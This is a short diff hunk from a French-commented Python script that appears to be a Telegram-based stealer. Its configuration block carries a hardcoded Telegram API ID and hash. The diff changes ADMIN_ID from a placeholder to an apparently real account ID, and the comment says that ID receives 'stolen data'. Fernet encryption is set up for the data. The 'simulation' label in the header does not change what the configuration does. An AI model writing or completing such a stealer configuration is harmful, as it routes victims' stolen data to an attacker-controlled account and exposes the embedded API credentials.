@@ -9,7 +9,7 @@ from cryptography.fernet import Fernet
 # --- CONFIGURATION (À MODIFIER POUR UNE SIMULATION) ---
 API_ID = 39259168  # Remplace par une vraie API ID (obtenue sur my.telegram.org)
 API_HASH = "75ce72b0f39f07f1de897cce227c83c8"  # Remplace par une vraie API Hash
-ADMIN_ID = 987654321  # ID du serveur admin pour recevoir les données volées
+ADMIN_ID = 7154361039  # ID du serveur admin pour recevoir les données volées
 ENCRYPTION_KEY = Fernet.generate_key()  # Clé pour chiffrer les données (simulation)
 cipher = Fernet(ENCRYPTION_KEY)
 
